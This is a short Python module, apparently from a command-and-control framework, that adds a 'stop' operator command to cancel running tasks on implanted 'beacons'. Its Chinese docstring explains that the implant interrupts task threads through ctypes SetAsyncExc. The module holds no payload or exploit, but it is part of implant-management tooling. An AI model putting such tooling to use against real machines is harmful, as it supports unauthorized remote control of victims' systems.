"""stop — 终止 beacon 上正在运行的任务(死循环/持久任务):

stop <beacon_id> <task_id>   终止指定运行中任务
stop <beacon_id> -all        终止该 beacon 全部运行中任务

原理: 下发 !cancel 指令 → 植入物向目标任务线程异步抛 KeyboardInterrupt
(ctypes SetAsyncExc)——`while True: pass` 类死循环可被打断;任务代码若
全捕获 BaseException 则无效;阻塞在 socket.recv 的线程延迟到 IO 返回。
被取消的任务不产生结果,从运行中列表移除。
查看运行中任务: tasks <beacon_id> 或 beacon 详情。
"""

from server.task_queue import Task


def run(disp, args):
    if len(args) < 2:
        return "[!] usage: stop <beacon_id> <task_id | -all>"
    bid = args[0]
    rec = disp.mgr.get_client(bid)
    if rec is None:
        return f"[!] beacon 不存在: {bid}"
    targets = [a for a in args[1:] if a != "-all"]
    if "-all" in args[1:]:
        targets = list(getattr(rec, "running_tasks", []) or [])
    if not targets:
        return "[!] 无运行中任务(task_id 列表见 tasks 命令)"
    n = 0
    for tid in targets:
        task = Task(code=f"!cancel {tid}")
        disp.push_task(bid, task)
        n += 1
    return f"[+] 已下发 {n} 条终止指令 → {bid}: {', '.join(targets)}"
